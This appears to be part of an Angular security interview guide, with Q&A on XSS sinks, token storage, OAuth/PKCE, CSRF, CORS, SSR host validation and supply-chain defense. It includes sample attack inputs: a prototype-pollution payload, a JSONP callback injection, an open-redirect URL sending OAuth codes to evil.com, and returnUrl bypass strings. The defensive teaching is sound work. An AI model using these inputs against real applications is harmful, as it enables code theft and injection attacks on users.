APIs like `Compiler` and `compileModuleAndAllComponentsAsync` let apps turn template strings into components at runtime. They needed the JIT compiler in the bundle, which made apps bigger and slower, and created a path for template injection.

With Ivy and standalone components, the recommended way to build dynamic UIs is to create known components with `ViewContainerRef.createComponent` and pass data as inputs. If you truly need user-authored templates, use a sandboxed iframe on a separate origin.

## 319: What is prototype pollution and how can it affect an Angular app?

Prototype pollution is when an attacker gets code to set properties on `Object.prototype`, usually through a deep merge of untrusted JSON like `{"__proto__": {"isAdmin": true}}`. After that, every object seems to have `isAdmin: true`.

In Angular apps it can come from merging query params or API data into config objects with unsafe merge helpers. It can change app logic, skip UI checks, or turn on dangerous options in libraries (gadgets) that lead to XSS. Use safe merge functions, `Object.create(null)` for maps, and validate data with schemas.

## 320: Are Angular template expressions a sandbox?

No. Template expressions can only see the component's members (they can't directly write `window` or `document`), but that's a design choice for clean templates, not a security boundary.

AngularJS once had an "expression sandbox" that was bypassed many times and then removed. In modern Angular the security boundary is that templates come from your own code at build time, not from users.

## 321: How do you find all DOM XSS sinks in a large Angular codebase?

Search for known dangerous APIs and check each hit:

```bash
grep -rnE "innerHTML|outerHTML|insertAdjacentHTML|document\.write|bypassSecurityTrust|nativeElement|eval\(|new Function|setTimeout\(['\"]|\.src\s*=|location\.(href|assign|replace)" src/
```

Then use data-flow tools like CodeQL, which can follow a value from a source (route params, `postMessage`, HTTP responses) to a sink. Trusted Types in report-only mode finds the sinks that actually run in production, including ones inside libraries.

## 322: What is the difference between ElementRef, Renderer2 and afterNextRender for DOM work?

- `ElementRef.nativeElement` gives the raw element. Any DOM API you call on it skips sanitization.
- `Renderer2` wraps DOM operations so they work on the server and in other platforms, but it doesn't sanitize either.
- `afterNextRender` and `afterEveryRender` run code only in the browser after rendering, which is where direct DOM work belongs.

None of them sanitize. Security comes from not putting untrusted strings into dangerous properties, regardless of the API you use.

## 323: How would you design token storage for a new Angular app?

My order of preference:

1. **BFF with httpOnly cookies**: tokens never reach JavaScript. Best for sensitive apps.
2. **Access token in memory, refresh token in an httpOnly cookie** for a refresh endpoint on the same site: XSS can't steal long-lived tokens.
3. **Access token in memory, rotating refresh token in storage**: works with many identity providers, but a stolen refresh token is still useful until rotation catches it.
4. **Everything in localStorage**: simplest, but XSS can take everything.

Whatever the choice, keep access tokens short-lived and treat XSS prevention as the main defense.

## 324: How does a BFF work with an Angular app in practice?

1. The user clicks login, and Angular sends the browser to `/bff/login`.
2. The BFF runs the OAuth code flow with PKCE as a confidential client (it can keep a client secret) and stores the tokens server-side.
3. The BFF sets an httpOnly, Secure, SameSite session cookie.
4. Angular calls `/bff/api/...`; the BFF checks the session, adds the access token and forwards the call.
5. Angular gets user info from `/bff/user` and logs out with `/bff/logout`.

The BFF must protect against CSRF, usually by requiring a custom header (like `X-CSRF: 1`) that Angular adds in an interceptor and that cross-site forms can't send.

## 325: What is DPoP and how can it protect tokens in an SPA?

DPoP (Demonstrating Proof of Possession, RFC 9449) binds an access token to a key pair that the app holds. For every request, the app signs a small JWT (the DPoP proof) with its private key, and the server checks that the token belongs to that key.

In the browser, you create the key with WebCrypto as non-extractable and store it in IndexedDB. A stolen token is useless without the key, and XSS can't export the key. XSS can still use the key while it's running on the page, so it limits theft, not live misuse.

## 326: How do you avoid multiple refresh calls when many requests get 401 at once?

Share one in-flight refresh between all requests:

```ts
@Injectable({ providedIn: "root" })
export class TokenRefresher {
  private http = inject(HttpClient);
  private inFlight$: Observable<string> | null = null;

  refresh(): Observable<string> {
    this.inFlight$ ??= this.http
      .post<{ accessToken: string }>(
        "/api/auth/refresh",
        {},
        { context: new HttpContext().set(SKIP_AUTH, true) },
      )
      .pipe(
        map((r) => r.accessToken),
        finalize(() => (this.inFlight$ = null)),
        shareReplay({ bufferSize: 1, refCount: false }),
      );
    return this.inFlight$;
  }
}
```

All failed requests wait for the same refresh and retry with the new token. With rotating refresh tokens this matters a lot, because two parallel refreshes can look like token reuse and end the session.

## 327: How do you stop two browser tabs from refreshing tokens at the same time?

Use the Web Locks API so only one tab refreshes, and share the result:

```ts
async refreshAcrossTabs(): Promise<string> {
  return navigator.locks.request('token-refresh', async () => {
    const current = this.readSharedToken();
    if (current && !isExpired(current)) return current; // another tab already refreshed
    const fresh = await firstValueFrom(this.refresher.refresh());
    this.writeSharedToken(fresh);
    return fresh;
  });
}
```

Without this, tabs race to use the same rotating refresh token and the identity provider may treat the second use as theft and revoke the whole session.

## 328: Is it safe to retry a POST after refreshing a token?

Usually yes, because a 401 normally means the server rejected the request before doing anything. But that depends on the server: if a gateway returns 401 after a partial action, or a timeout hides the real result, a retry could repeat the action.

For important actions like payments, the API should support idempotency keys so a retry can't happen twice:

```ts
this.http.post("/api/payments", body, {
  headers: { "Idempotency-Key": crypto.randomUUID() },
});
```

## 329: What requests skip your Angular interceptors?

Interceptors only see requests made with `HttpClient`. These skip them:

- `fetch` or `XMLHttpRequest` called directly, often inside third-party SDKs.
- `<img>`, `<script>`, `<iframe>`, form submits and navigation.
- WebSockets and `EventSource`.
- Requests from the service worker or Web Workers.

So the XSRF header and auth header aren't added there, and token-related logic like refresh and logout doesn't apply. Check how each SDK authenticates.

## 330: How can tokens leak to third parties even if your interceptor is correct?

- Error tracking tools that record request headers or breadcrumbs.
- Session replay tools that capture `localStorage` or network data.
- Tokens in URLs leaking through `Referer`, logs or analytics.
- Browser extensions with access to the page.
- Third-party scripts reading `localStorage` directly.
- Copying a token into a support ticket or chat while debugging.

Keep tokens out of storage that other scripts can read, and configure tools to drop `Authorization` headers.

## 331: Can you hide the access token from XSS by keeping it in a Web Worker?

Partly. If only the worker holds the token and makes the API calls, an injected script can't read the token directly. But it can still send messages to the worker asking it to make requests, so it can act as the user while it runs.

It also adds complexity. It helps against token theft and replay later, not against XSS itself. A BFF gives similar benefits with less custom code.

## 332: Why is XSS "game over" no matter where tokens are stored?

Once an attacker's script runs on your origin, it can do everything the user can: call your APIs (the browser attaches cookies, or the script uses your app's own services), read what's on the screen, change the UI to ask for passwords, and change settings like the account email.

Storage choice only decides whether the attacker can take the token away and use it later. Preventing XSS is the real goal.

## 333: How would you design permissions so the UI and API stay in sync?

The API is the source of truth. At login, it returns the user's permissions (not just roles), like `['orders:read', 'orders:refund']`. The UI uses those to show or hide features, and the API checks the same permission names on each endpoint.

```ts
@Injectable({ providedIn: "root" })
export class Permissions {
  private perms = signal<Set<string>>(new Set());
  can = (p: string) => this.perms().has(p);
  load() {
    return inject(HttpClient)
      .get<string[]>("/api/me/permissions")
      .pipe(tap((p) => this.perms.set(new Set(p))));
  }
}
```

Using permissions instead of role names means role changes on the server don't need UI changes.

## 334: How do you write a permission-based structural directive?

```ts
@Directive({ selector: "[appCan]" })
export class Can {
  private tpl = inject(TemplateRef);
  private vcr = inject(ViewContainerRef);
  private perms = inject(Permissions);
  appCan = input.required<string>();

  constructor() {
    effect(() => {
      this.vcr.clear();
      if (this.perms.can(this.appCan())) this.vcr.createEmbeddedView(this.tpl);
    });
  }
}
```

```html
<button *appCan="'orders:refund'" (click)="refund()">Refund</button>
```

The same thing can be done with `@if (perms.can('orders:refund'))`. Either way it's UI only; the refund endpoint checks the permission again.

## 335: What happens to the UI when a user's role changes during their session?

If permissions are only loaded at login, the UI keeps showing old options. The server will deny actions that are no longer allowed (403), which is the important part, but the UI is confusing.

Reload permissions on 403 responses, periodically, or when the server signals a change (for example through a WebSocket event). Also keep access tokens short so claims inside them don't stay stale for long.

## 336: What security issues are specific to multi-tenant Angular apps?

- The tenant ID in the URL or a header must be checked by the server against the user's memberships, never trusted.
- Caches (HTTP cache, state stores, service worker) must be keyed by tenant and cleared on switch, or data from tenant A shows up in tenant B.
- Tenant-specific branding or custom HTML must be sanitized like any user content.
- Subdomain-per-tenant setups need careful cookie scoping and CORS allowlists.

## 337: How can you serve different components on the same path depending on role?

Define the path twice with `canMatch`. The router uses the first one whose guard passes:

```ts
export const routes: Routes = [
  {
    path: "dashboard",
    canMatch: [() => inject(Auth).isAdmin()],
    loadComponent: () => import("./admin-dashboard"),
  },
  { path: "dashboard", loadComponent: () => import("./user-dashboard") },
];
```

This keeps URLs clean and doesn't load the admin code for normal users. The admin chunk is still a public file, so the admin APIs must check roles.

## 338: How can a user bypass Angular guards and what does that tell you?

- Call the API directly with curl or the browser's network tab.
- Change the auth state in memory with breakpoints, or edit tokens in storage.
- Download lazy chunks directly from the server.
- In dev builds, use the `ng` debugging global in the console to change component state.

All of this means guards can't be part of your security model. Treat them like form validation: helpful for normal users, worthless against attackers.

## 339: Walk through the OAuth2 authorization code flow with PKCE and what each part protects.

1. The app creates a random `code_verifier`, hashes it into a `code_challenge`, and creates random `state` and `nonce`.
2. It redirects to the authorization endpoint with `client_id`, `redirect_uri`, `scope`, `state`, `nonce`, `code_challenge` and `code_challenge_method=S256`.
3. The user logs in. The provider redirects back with `code` and `state`.
4. The app checks `state` (stops login CSRF), then posts `code` and `code_verifier` to the token endpoint.
5. The provider checks the verifier against the challenge (stops stolen code use), and returns tokens.
6. The app checks the ID token's `iss`, `aud`, `exp` and `nonce` (stops replay and mix-up).

The exact `redirect_uri` match stops codes from being sent to attacker sites.

## 340: What is an OAuth mix-up attack and how is it prevented?

When an app supports several identity providers, an attacker-controlled provider can trick the app into sending a code that came from the honest provider to the attacker's token endpoint.

RFC 9207 adds an `iss` parameter to the authorization response, so the app can check which provider actually sent the response. Use a library that checks `iss`, and keep separate redirect URIs per provider if you support several.

## 341: What does the OAuth 2.0 for Browser-Based Applications guidance recommend?

The IETF document for browser apps describes three designs, from most to least secure:

1. **BFF**: a back-end handles OAuth and tokens; the browser only has a session cookie.
2. **Token-mediating back-end**: a back-end gets tokens and gives the access token to the browser, but keeps the refresh token.
3. **Browser-based OAuth client**: the SPA does the whole flow with PKCE and holds tokens.

It's clear that option 3 is acceptable only with extra care: short-lived tokens, rotating refresh tokens, strict CSP and strong XSS defenses. For apps with sensitive data, it recommends a BFF.

## 342: How can an open redirect be used to steal OAuth codes?

If the identity provider allows a broad redirect URI (like any path on your domain), and your app has an open redirect, an attacker can set `redirect_uri=https://app.example.com/redirect?to=https://evil.com`. The provider sends the code to your site, your open redirect forwards it to the attacker, and the code is in their logs or `Referer`.

PKCE limits the damage, because the attacker doesn't have the verifier. Still, register exact redirect URIs and fix open redirects.

## 343: Where should the PKCE code_verifier be stored during the redirect?

In `sessionStorage`, because the app has to survive the full-page redirect to the provider and back. It's scoped to one tab and is cleared when the tab closes.

Delete it right after the code exchange. Libraries do this for you; if you write your own (which you usually shouldn't), keep it short-lived and never put it in `localStorage` or the URL.

## 344: What are the trade-offs of MSAL's cacheLocation options?

- `sessionStorage`: survives reloads in the same tab, not shared between tabs. A good default.
- `localStorage`: shared between tabs and survives restarts, so single sign-on across tabs is smoother, but tokens sit on disk and are readable by XSS longer.
- `memoryStorage`: safest against XSS reading tokens later, but every reload needs a silent token request.

MSAL v4 and later also encrypt the local storage cache with a key kept in session cookies. That helps with tokens left on disk, but not against XSS running in your page.

## 345: How do you avoid redirect loops with MSAL Angular?

Make sure redirect handling finishes before guards run:

- Add `MsalRedirectComponent` to the bootstrap, or call `handleRedirectObservable()` once at startup.
- Wait for `inProgress$` to become `InteractionStatus.None` before checking accounts or calling `loginRedirect`.
- Don't put `MsalGuard` on the redirect URI route itself.

Loops often come from the guard calling `loginRedirect` while the previous redirect response is still being processed.

## 346: Why should you request the smallest scopes possible?

The access token can do whatever its scopes allow. If it's stolen through XSS or a leak, broad scopes like full mailbox access or admin APIs make the damage much bigger.

Ask for scopes when the user needs the feature (incremental consent), use different tokens for different APIs, and avoid `offline_access` unless you really need refresh tokens.

## 347: What is audience confusion with tokens?

It's when an API accepts a token that was meant for something else, like an ID token or an access token issued for a different API. If API B accepts tokens for API A, anyone who can get an A token (or a malicious API A) can call API B.

The API must check the `aud` claim. The Angular side should never send the ID token as a bearer token and should request a token for the right resource.

## 348: What are front-channel and back-channel logout?

They're OIDC ways for the identity provider to tell apps that the user logged out somewhere else:

- **Front-channel**: the provider loads each app's logout URL in a hidden iframe. Third-party cookie blocking often breaks it.
- **Back-channel**: the provider sends a signed logout token straight to the app's server. That needs a back-end, like a BFF.

A pure SPA can't receive back-channel logout. It has to rely on short token lifetimes and refresh failures to notice the session ended.

## 349: How do you share idle activity between tabs?

If the user is active in one tab, other tabs shouldn't log them out. Broadcast activity and keep one shared "last active" time:

```ts
const channel = new BroadcastChannel("activity");
const lastActive = signal(Date.now());

fromEvent(document, "pointerdown")
  .pipe(throttleTime(30_000))
  .subscribe(() => {
    const now = Date.now();
    lastActive.set(now);
    channel.postMessage(now);
  });

channel.onmessage = (e) => lastActive.set(Math.max(lastActive(), e.data));
```

The idle timer then works from `lastActive()` in every tab, and the logout broadcast makes all tabs log out together.

## 350: What is an absolute session lifetime and why have one?

It's a hard limit on how long a session can last, for example 12 hours, no matter how active the user is. Without it, rotating refresh tokens can keep a session alive forever, including a stolen one.

It's enforced by the identity provider or server (refresh token max lifetime, session max age). The Angular app should show a clear message when it happens instead of failing randomly.

## 351: How do you add step-up authentication for a sensitive action?

Before an action like changing bank details, ask the identity provider for a fresh or stronger login, for example with `max_age=0` (force re-login) or `acr_values` for MFA:

```ts
// angular-oauth2-oidc
this.oauthService.initCodeFlow("", { max_age: "0", acr_values: "mfa" });
```

The API must check the `auth_time` and `acr` claims in the token and refuse the action if the login is too old or too weak. Asking for step-up only in the UI does nothing if the API doesn't check.

## 352: How does Angular's XSRF protection work as a double-submit cookie, and what are its weak points?

The server sets a random token in a readable cookie, Angular copies it into a header, and the server checks that they match. An attacker on another site can't read the cookie, so they can't build the header.

Weak points:

- A sibling subdomain (or a man-in-the-middle on HTTP) can set cookies for your domain ("cookie tossing") and pick its own token, then use it in a matching header.
- If the token isn't tied to the session, any valid pair works.

Fixes: use the `__Host-` prefix for the cookie, tie the token to the session (or sign it with HMAC on the server), and use HSTS.

## 353: What is login CSRF and how do you prevent it?

Login CSRF is when an attacker makes the victim's browser log in to the attacker's account. The victim then uses the app thinking it's theirs and may save private data (cards, search history) into the attacker's account.

Prevent it with CSRF protection on the login endpoint too, and with the `state` parameter in OAuth flows. A good OIDC library handles `state` for you.

## 354: How can a JSON API be hit by CSRF?

If the server accepts JSON without checking the content type, an attacker can submit an HTML form with `enctype="text/plain"` that creates a body like `{"amount":1000,"to":"attacker","x":"=..."}`. The browser sends it with cookies and no preflight.

The server should require `Content-Type: application/json` (which forces a CORS preflight for cross-origin requests), check a CSRF token or custom header, and use SameSite cookies.

## 355: What CORS mistakes have you seen in real projects?

- Allowing `null` as an origin. Sandboxed iframes and some redirects send `Origin: null`, so attackers can use that.
- Matching origins with a weak regex, like `/example\.com$/`, which also allows `attackerexample.com`.
- Trusting all subdomains, so one vulnerable subdomain can read your API.
- Reflecting any origin with credentials.
- Forgetting `Vary: Origin` when the response changes per origin, so a cache serves the wrong CORS headers.

## 356: Why does a JSONP endpoint need to validate the callback name?

The server inserts the callback name into the JavaScript response. If it accepts anything, an attacker can make it return their own code, for example `callback=alert(1);//`. Since the response comes from a trusted domain, it can bypass CSP allowlists that include that domain.

JSONP servers must allow only simple identifiers like `^[a-zA-Z_$][\w$.]*$`, and should be replaced with CORS when possible.

## 357: What URL tricks bypass weak returnUrl validation?

- `//evil.com` (protocol-relative URL).
- `/\evil.com` (browsers treat `\` like `/` in some cases).
- `https:evil.com` or other forms without slashes.
- Encoded characters like `%2F%2Fevil.com` that get decoded later.
- `javascript:` URLs if the value goes to `location`.
- Usernames in URLs, like `https://example.com@evil.com`.

The safe approach is to parse with `new URL(value, location.origin)` and check that `url.origin === location.origin`, then navigate to `url.pathname + url.search + url.hash`.

## 358: What was the protocol-relative URL issue in Angular's XSRF interceptor?

In 2025 (CVE-2025-66035), Angular's XSRF interceptor treated URLs starting with `//` as same-origin, because they don't start with `http`. So a request to `//evil.com/api` got the `X-XSRF-TOKEN` header, and the token leaked to another domain.

It was fixed in 19.2.16, 20.3.14 and 21.0.1. It's a good example of why URL checks must use real parsing, and why you should keep Angular patched.

## 359: What is host header injection in Angular SSR and how does allowedHosts help?

During SSR, Angular builds absolute URLs (for example to resolve relative `HttpClient` requests) from the incoming request's `Host` and `X-Forwarded-*` headers. If an attacker sends a fake `Host`, the server might send requests to the attacker's server (SSRF) or produce links and redirects pointing there, which a cache might store.

Current Angular SSR validates those headers. You list the hosts you serve:

```json
"security": { "allowedHosts": ["example.com", "*.example.com"] }
```

or pass `allowedHosts` to `AngularNodeAppEngine`, or set `NG_ALLOWED_HOSTS`. Requests with unknown hosts get a `400`. Avoid `*`, which allows any host.

## 360: What does trustProxyHeaders do in Angular SSR?

By default, Angular SSR ignores and removes `Forwarded` and `X-Forwarded-*` headers, because clients can set them freely. If your app runs behind a proxy or load balancer that sets them correctly, you can tell Angular to trust specific ones:

```ts
const angularApp = new AngularNodeAppEngine({
  allowedHosts: ["example.com"],
  trustProxyHeaders: ["x-forwarded-host", "x-forwarded-proto"],
});
```

Only enable this if your proxy overwrites these headers, never if it just passes through what the client sent.

## 361: How could relative URLs in HttpClient lead to SSRF during SSR?

In the browser, `this.http.get('/api/data')` goes to the page's origin. On the server, Angular has to turn it into an absolute URL using the incoming request's URL. If that URL comes from untrusted headers, the server may call `http://attacker-host/api/data` or an internal address.

Angular fixed several issues like this in 2025 and added the host validation. Good habits: keep Angular updated, set `allowedHosts`, and use an absolute, configured API base URL on the server (for example from a server-only environment variable) instead of relying on the request.

## 362: How did a race condition in Angular SSR leak data between requests, and how was it fixed?

In 2025 (CVE-2025-59052), Angular's SSR had a shared platform injector that could be used by concurrent requests. Under load, one request's rendering could pick up providers from another request, leaking data between users.

The fix requires a `BootstrapContext` passed to `bootstrapApplication` in `main.server.ts`, so each request gets its own platform:

```ts
const bootstrap = (context: BootstrapContext) =>
  bootstrapApplication(App, config, context);
export default bootstrap;
```

`ng update` applies this change. It's a good reminder that SSR code serves many users from one process.

## 363: How does Angular prevent XSS through serialized TransferState?

TransferState is written into the page as JSON inside a `<script type="application/json">` tag. If the JSON contained `</script><script>...`, it could close the tag and start a new script.

Angular escapes characters like `<` in the serialized JSON so data can't break out of the tag. If you write your own state into the HTML in `server.ts`, you need to do the same escaping; plain `JSON.stringify` isn't enough inside a script tag.

## 364: How do you set security headers per route in Angular SSR?

Use `RESPONSE_INIT` from `@angular/core` inside a component or resolver that runs on the server:

```ts
export class PaymentPage {
  constructor() {
    const init = inject(RESPONSE_INIT, { optional: true });
    if (init) {
      init.headers = new Headers(init.headers);
      (init.headers as Headers).set("Cache-Control", "no-store");
      (init.headers as Headers).set("Referrer-Policy", "no-referrer");
    }
  }
}
```

For headers that apply to all pages, it's simpler to set them in `server.ts` middleware. You can also set `headers` per route in `serverRoutes` with `@angular/ssr` route config.

## 365: What are the caching risks when SSR pages contain user data?

If a CDN or reverse proxy caches an SSR page that was rendered for a logged-in user, the next visitor gets that user's HTML, including names, emails and TransferState data.

Send `Cache-Control: private, no-store` on personalized pages, or only cache pages rendered without cookies. Check the CDN's rules for which cookies or headers make a request uncacheable. Many real data leaks came from this.

## 366: How do you keep server-only secrets out of the browser bundle in an SSR project?

- Read secrets from `process.env` only in `server.ts` or files that only the server imports.
- Don't import server config into components or services that are also used in the browser.
- Use separate injection tokens provided only in `app.config.server.ts`.
- Check the browser bundle (`dist/<app>/browser`) for secret values in CI.

The Angular builder creates separate browser and server bundles, but anything imported by browser code ends up in the browser bundle.

## 367: How can SSR be abused for denial of service?

Every SSR request runs Angular on your server, which uses CPU and memory. An attacker can request expensive pages (big lists, slow APIs, many query param combinations) in large numbers and overload the server.

Add rate limiting, timeouts for API calls during SSR, caching for public pages, limits on query params that change rendering cost, and fall back to client-side rendering when the server is busy.

## 368: What should an SSR server show when rendering fails?

A generic error page with a status code, never stack traces, file paths or environment details. Log the full error on the server.

In development, detailed errors are useful, so make sure your `server.ts` error handler checks the environment and doesn't send `err.stack` in production.

## 369: What is the risk of prerendering with build-time credentials?

During prerendering, the app runs at build time and might call APIs with a build service account that sees more data than the public should, for example draft content or internal data. Whatever it renders is written to static HTML and served to everyone.

Use read-only credentials limited to public content for prerendering, and review which routes are prerendered.

## 370: How do secrets end up in Angular bundles by accident?

- Putting them in `environment.ts` "just for now".
- Using `define` or `process.env` replacement for things like API keys.
- Importing a shared config file that has both public and server values.
- Copying a `.env` file into `public/` or `assets/`.
- Third-party SDKs that need a secret key, used with the secret key instead of the public one.

The bundle gets everything that's imported, even if the code path never runs.

## 371: How do you find what code is in your production bundle?

Generate stats and inspect them:

```bash
ng build --stats-json
npx esbuild-visualizer --metadata dist/my-app/stats.json
```

You can also use `source-map-explorer` with source maps turned on in a local build. This shows which files and packages are included, which helps find leaked config files, unexpected server code or unused libraries.

## 372: What is sourcesContent in source maps and why does it matter?

Source maps usually include the full original source code in a `sourcesContent` field, not just the mapping. So a public `.map` file gives away your whole TypeScript code, including comments, internal endpoint names and TODO notes.

Even without `sourcesContent`, maps reveal file structure and names. If you must keep public maps, at least make sure no secrets or sensitive comments are in the code, which you should do anyway.

## 373: What is double-clickjacking?

Double-clickjacking is a newer clickjacking variant that doesn't use iframes. The attacker opens a new window and asks the user to double-click. Between the first and second click, the attacker switches the window to your real page, so the second click lands on a sensitive button like "Allow" or "Authorize".

Because no frame is involved, `frame-ancestors` doesn't help. Defenses include disabling sensitive buttons until the page has had real user interaction (mouse movement or a key press) for a short time, and confirming critical actions with something the attacker can't control.

## 374: Why should user-uploaded content live on a separate domain?

Files served from your app's origin run in that origin's security context. An uploaded HTML or SVG file opened directly could run scripts with access to your cookies and storage.

Serving uploads from a separate domain like `example-usercontent.com` (not a subdomain, ideally a different registrable domain) means any script in them runs in a different origin and can't touch your app. Big platforms do this for exactly this reason.

## 375: How can a subdomain takeover affect your Angular app?

If a DNS record points a subdomain to a deleted cloud resource (an old S3 bucket, Heroku app or Azure site), an attacker can claim that resource and serve their content on your subdomain.

That subdomain might be in your CSP allowlist, CORS allowlist or cookie domain, so the attacker can load scripts into your app, read API responses or set cookies. Clean up old DNS records and keep allowlists to exact hosts you actively use.

## 376: How do you decide if an npm audit finding actually matters?

Ask:

- Does the vulnerable package reach the browser bundle or the SSR server, or is it only in build tooling?
- Is the vulnerable function used, and can untrusted input reach it?
- What's the impact if exploited?

For example, a ReDoS in a dev server's dependency usually matters little, while an XSS in a Markdown library you use for user comments matters a lot. Document why you accept or defer a finding, and track it.

## 377: What Angular security issues were fixed in recent years?

A few from 2025:

- **CVE-2025-66035**: XSRF token leaked to protocol-relative URLs in `HttpClient`.
- **CVE-2025-66412**: some SVG and MathML URL attributes weren't sanitized in templates.
- **CVE-2025-59052**: SSR race condition could leak data between requests, fixed with `BootstrapContext`.
- Several SSR fixes for host header and URL handling that led to the `allowedHosts` validation.

These show that framework bugs happen, so staying on a supported, patched version is part of your security, not just a nice-to-have.

## 378: How do you roll out an urgent Angular security patch across many apps?

1. Read the advisory: affected versions, conditions (for example, only SSR apps).
2. List affected apps from your SBOM or a repo search for `@angular/core` versions.
3. Update with `ng update @angular/core@<patched>` or bump the patch range and refresh the lockfile.
4. Run tests and a quick smoke test.
5. Deploy, and check that the new version is live (`ng-version` attribute, or bundle hashes).

In a monorepo with one version for all apps (like Nx), this is one change, which is a real benefit.

## 379: What did the 2025 npm worm attacks teach front-end teams?

In 2025, attackers took over popular npm packages through phishing and stolen tokens, then published versions that stole credentials and, in the "Shai-Hulud" case, spread themselves by publishing to other packages the victims maintained.

Lessons: use lockfiles and `npm ci`, don't auto-install the newest versions right away (pnpm's `minimumReleaseAge` can delay new versions), keep secrets out of install steps, use short-lived publish tokens or trusted publishing, and turn on 2FA for npm accounts.

## 380: What is npm provenance and how do you check it?

Provenance is a signed statement that a package was built from a specific source repo and commit by a specific CI workflow. Packages published from GitHub Actions or GitLab CI with trusted publishing can include it.

```bash
npm audit signatures
```

This checks registry signatures and provenance for installed packages. It doesn't prove the code is safe, but it makes it harder to publish a package that wasn't built from the public source.

## 381: What is lockfile injection and how do you catch it?

A pull request changes `package-lock.json` so a package resolves to a different URL (like an attacker's tarball) while `package.json` looks unchanged. Reviewers rarely read lockfile diffs, so it slips through.

Use a tool like `lockfile-lint` in CI to make sure every `resolved` URL points to the official registry over HTTPS, and be suspicious of large lockfile changes in unrelated PRs.

```bash
npx lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https
```

## 382: What is an SBOM and why does it help Angular teams?

An SBOM (software bill of materials) is a list of all components and versions in your app. You can generate one in CI:

```bash
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

When a new advisory comes out, you can search your SBOMs to see which apps and versions are affected instead of checking every repo by hand. Some customers and regulations now ask for them.

## 383: What CSP settings do Web Workers need, and why are blob workers risky?

Workers are controlled by `worker-src` (falling back to `script-src`). Angular CLI workers are separate files, so `worker-src 'self'` works.

Some libraries create workers from blob URLs (`new Worker(URL.createObjectURL(blob))`), which needs `worker-src blob:`. That lets any code on the page start a worker from any string, which weakens your policy. Prefer libraries that ship a real worker file.

## 384: Why should you never accept "null" as a postMessage origin?

Sandboxed iframes, `data:` URLs and some other contexts send messages with `event.origin === 'null'`. An attacker can create a sandboxed iframe on their own page that sends messages with origin `null`.

If your check is `if (allowedOrigins.includes(event.origin))` and the list contains `'null'` (maybe added during debugging), anyone can pass it. Only allow real, specific origins.

## 385: How does Cross-Origin-Opener-Policy affect OAuth popups?

`Cross-Origin-Opener-Policy: same-origin` cuts the link between your page and cross-origin windows it opens, which protects against attacks through `window.opener`. But it also breaks login popups that need to talk back to your window.

Use `same-origin-allow-popups` if you open login popups, or switch to redirect login. Test the whole login flow after changing COOP.

## 386: What are COEP and CORP, and when do Angular apps need them?

- `Cross-Origin-Embedder-Policy: require-corp` makes the page load only cross-origin resources that explicitly allow it.
- `Cross-Origin-Resource-Policy` is the header a resource uses to say who may load it.

Together with COOP, they make the page "cross-origin isolated", which is required for `SharedArrayBuffer` and high-precision timers. Most Angular apps don't need it, but apps using WebAssembly threads do. It also protects your resources from being read by side-channel attacks like Spectre.

## 387: How can translation files become an XSS vector with Angular i18n?

With Angular's built-in i18n, translations are compiled into the app at build time, just like templates. The compiler maps element placeholders in the translation back to the original elements, but the translation file is still trusted input to the compiler.

So a malicious or careless translation can change text, links and structure. Treat translation files like source code: review changes, keep them in the repo, and don't let an external tool push them straight into production builds without review.

## 388: What are the risks of loading translations at runtime?

With `loadTranslations()` from `@angular/localize`, or runtime libraries like `ngx-translate` or Transloco, translations are fetched when the app starts. If the file comes from a CDN or translation service, whoever controls it controls the text in your app, and possibly HTML if you render translations with `[innerHTML]`.

Load translations from your own origin, version them with your release, and avoid HTML in translation strings. If you must load from elsewhere, validate the shape and render translations as text.

## 389: How would you threat model an Angular app?

List what you protect (user data, sessions, admin actions), who might attack (other users, outside attackers, malicious packages), and where data crosses trust boundaries (browser to API, API to third parties, CDN to browser, SSR server to internal services).

Then go through each boundary with a simple model like STRIDE (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege) and write down the controls. For an Angular app, the usual hot spots are auth flows, any HTML rendering of user content, third-party scripts, SSR and the API's permission checks.

## 390: What would you check in a pen test of an Angular SPA?

- XSS in every place user data is rendered, especially rich text, Markdown, file names and URLs.
- API authorization: change IDs, roles and tenant IDs in requests.
- Auth: token storage, expiry, logout, refresh behavior, OAuth redirect URIs.
- CSRF on cookie-based endpoints.
- CORS rules and security headers.
- Secrets in bundles and source maps.
- Open redirects in `returnUrl` and similar params.
- SSR: host header handling, caching of private pages, error pages.

## 391: How do you test auth flows end-to-end without weakening security?

Use a real identity provider instance for tests (a test tenant or a local Keycloak in Docker) with test users, rather than turning off auth in a "test mode" that might accidentally ship.

If you need a shortcut for speed, log in through the API once, save the browser storage state (Playwright `storageState`), and reuse it. Any "auth bypass" config must be impossible to enable in production builds.

## 392: How do you prevent bypassSecurityTrust from slipping into the code with tests?

Besides lint rules, you can add a simple test that scans the source:

```ts
import { globSync, readFileSync } from "node:fs";

it("only TrustedContentService uses bypassSecurityTrust", () => {
  const offenders = globSync("src/**/*.ts")
    .filter((f) => !f.endsWith("trusted-content.service.ts"))
    .filter((f) => readFileSync(f, "utf8").includes("bypassSecurityTrust"));
  expect(offenders).toEqual([]);
});
```

`globSync` is in `node:fs` from Node 22. This kind of "architecture test" fails in CI with a clear message, which is easier to notice than a lint warning.

## 393: How would you write a CodeQL query idea for DOM XSS in Angular?

CodeQL's JavaScript libraries already model many sources (like `location`, `postMessage` data) and sinks (like `innerHTML`). For Angular, you'd add sources such as `ActivatedRoute` params and `HttpClient` responses, and sinks like `bypassSecurityTrustHtml` arguments and `Renderer2.setProperty(..., 'innerHTML', ...)`.

In practice, enabling GitHub code scanning with the default JavaScript/TypeScript queries finds the common cases, and custom queries cover your project-specific helpers.

## 394: How can CSP and Trusted Types reports help you detect attacks?

Violation reports show blocked script loads and blocked writes to dangerous sinks. A sudden spike of reports for one page, or reports with strange script URLs or payloads, can mean someone is trying an XSS attack or a library changed.

Send reports to an endpoint you monitor, filter out noise from browser extensions (sources like `chrome-extension://`), and alert on new patterns.

## 395: What would you do if you found an XSS vulnerability in production?

1. Confirm it and understand the impact: who can trigger it, whose data is exposed.
2. Deploy a fix or a quick mitigation (like a stricter CSP or disabling the feature).
3. Clean up stored payloads in the database.
4. Check logs and CSP reports for signs it was used.
5. If it may have been exploited, revoke sessions and tokens, and follow your incident process, including telling users if needed.
6. Add a test so it can't come back, and look for the same pattern elsewhere.

## 396: A secret was found in your deployed Angular bundle. What do you do?

1. Rotate the secret right away; assume it's compromised.
2. Check the service's logs for unusual use.
3. Remove it from the code and deploy.
4. Purge CDN caches and old bundle files if possible, but don't rely on that; old bundles are often cached or archived.
5. Move the functionality that needed the secret to a back-end endpoint.
